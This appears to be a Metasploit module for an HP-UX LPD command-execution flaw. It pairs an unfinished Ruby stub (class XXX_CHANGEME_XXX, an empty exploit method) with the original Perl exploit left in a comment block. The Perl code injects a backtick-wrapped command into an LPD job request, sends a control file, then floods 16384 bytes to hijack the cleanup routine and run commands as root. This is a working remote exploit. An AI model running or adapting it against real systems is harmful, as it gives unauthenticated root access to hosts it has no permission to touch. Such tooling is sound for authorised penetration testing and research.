require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'HP-UX LPD Command Execution',
			'Description'    => %q{
				This exploit abuses an unpublished vulnerability in the
				HP-UX LPD service. This flaw allows an unauthenticated
				attacker to execute arbitrary commands with the privileges
				of the root user. The LPD service is only exploitable when
				the address of the attacking system can be resolved by the
				target. This vulnerability was silently patched with the
				buffer overflow flaws addressed in HP Security Bulletin
				HPSBUX0208-213.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://archives.neohapsis.com/archives/hp/2002-q3/0064.html'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 200,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'hpux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::hpux_lpd_exec;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'HP-UX LPD Command Execution',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>'],
	'Arch'  => [ ],
	'OS'    => [ 'hpux' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The LPD server port', 515],
	  },
	'Payload' =>
	  {
		'Space'    => 200,
		'Keys'     => ['cmd_nospaceslash'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploit abuses an unpublished vulnerability in the HP-UX LPD
        service. This flaw allows an unauthenticated attacker to execute
        arbitrary commands with the privileges of the root user. The LPD
        service is only exploitable when the address of the attacking system
        can be resolved by the target. This vulnerability was silently patched
		with the buffer overflow flaws addressed in HP Security Bulletin HPSBUX0208-213.
}),
	'Refs'  =>  [
		['URL', 'http://archives.neohapsis.com/archives/hp/2002-q3/0064.html']
	  ],

	'Keys' => ['lpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');
	my $cmd = $self->GetVar('EncodedPayload')->RawPayload;

	my $res;

	# We use a second connection to exploit the bug
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	  
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	srand(time() + $$);
	my $num = int(rand() * 1000);

	$s->Send("\x02msf$num`$cmd`\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our second job request command");
		$s->Close;
		return;
	}

	$s->Send("\x02 32 cfA187control\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file");
		$s->Close;
		return;
	}

	$self->PrintLine("[*] Remember to kill the telnet process when finished");
	$self->PrintLine("[*] Forcing an error and hijacking the cleanup routine...");
	$s->Send(Pex::Text::AlphaNumText(16384));
	$s->Close;

	return;
}

=end


end
end	
